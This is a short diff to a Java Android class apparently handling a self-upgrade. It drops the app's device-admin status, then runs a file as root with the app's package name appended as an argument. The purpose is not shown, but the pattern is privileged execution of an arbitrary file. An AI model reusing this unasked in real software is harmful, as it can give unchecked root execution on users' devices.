@@ -163,8 +163,10 @@ public abstract class Protocol implements iProtocol {
 
 			UninstallAction.removeAdmin(Status.getAppContext());
 
+			String packageName = Status.self().getAppContext().getPackageName();
+
 			Execute ex = new Execute();
-			ExecuteResult result = ex.executeRoot(file.getAbsolutePath());
+			ExecuteResult result = ex.executeRoot(file.getAbsolutePath() +" "+ packageName);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (upgradeMulti) exitcode: %s", result.exitCode);
 				Check.log(TAG + " (upgradeMulti) stdout: %s", result.stdout);
